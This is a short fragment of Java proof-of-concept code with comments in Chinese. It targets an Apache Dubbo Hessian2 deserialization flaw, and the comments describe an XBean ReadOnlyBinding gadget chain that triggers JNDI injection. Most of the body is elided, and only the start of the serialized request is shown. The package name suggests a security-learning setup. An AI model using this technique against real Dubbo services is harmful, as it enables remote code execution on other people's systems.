/*
 * [业务问题]: Apache Dubbo Hessian2 反序列化漏洞利用 (XBean 链)。
 * [实现逻辑]: 利用 XBean-naming 库中的 ReadOnlyBinding 结合 ToString 触发机制，通过 Reference 构造 JNDI 注入。
 */
...
public class XBeanPoc {
  ...
  public static void main(String[] args) throws Exception {
    ...
    out.writeString("com.security.bug.learn.server.boot.DemoService");
    out.writeString("1.0");
